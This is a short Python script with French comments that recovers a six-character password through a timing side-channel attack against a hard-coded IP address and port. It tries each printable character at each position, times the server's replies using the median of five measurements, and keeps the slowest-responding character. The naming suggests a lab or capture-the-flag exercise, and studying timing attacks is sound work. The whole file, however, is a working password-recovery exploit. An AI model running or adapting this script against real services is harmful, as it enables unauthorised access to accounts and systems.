import socket
import string
import time
from statistics import median

server = "51.38.191.157"
port = 22222

longueur_mdp = 6  # trouvé en testant plusieurs longueurs à la main
nombre_mesures = 5  

# tous les caractères qu'on va essayer : lettres, chiffres, caractères spéciaux
caracteres_possibles = string.ascii_letters + string.digits + string.punctuation #  A, B, C, ..., Z, a, b, c, ..., z, 0, 1, 2, ..., 9, !, @, #, $, %, ^, &, *, (, ), -, _, +, =, [, ], {, }, |, \, :, ;, ", ', <, >, ,, ., ?, /

ma_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ma_socket.connect((server, port))

mot_de_passe_trouve = ""  # les caractères qu'on a déjà devinés

for position in range(longueur_mdp):

    meilleur_caractere = None
    meilleur_temps = 0

    for c in caracteres_possibles:

        # on construit un essai : ce qu'on a déjà trouvé + le caractère à tester
        # + des caractères de remplissage pour que la longueur totale soit bonne
        essai = mot_de_passe_trouve + c
        essai = essai + "a" * (longueur_mdp - len(essai))

        mesures = []
        for _ in range(nombre_mesures):
            debut = time.perf_counter() #perf._counter() est plus précis que time.time()
            ma_socket.sendall((essai + "\n").encode())
            ma_socket.recv(1024)
            mesures.append(time.perf_counter() - debut)

        temps_ecoule = median(mesures) #ON utilise la médiane pour réduire l'effet des mesures aberrantes

        if temps_ecoule > meilleur_temps:
            meilleur_temps = temps_ecoule
            meilleur_caractere = c

    mot_de_passe_trouve = mot_de_passe_trouve + meilleur_caractere
    print(f"Position {position + 1} : caractère trouvé = '{meilleur_caractere}' (temps = {meilleur_temps:.4f}s)")
    print("   mot de passe partiel :", mot_de_passe_trouve)

print()
print("Mot de passe complet trouvé :", mot_de_passe_trouve)

ma_socket.close()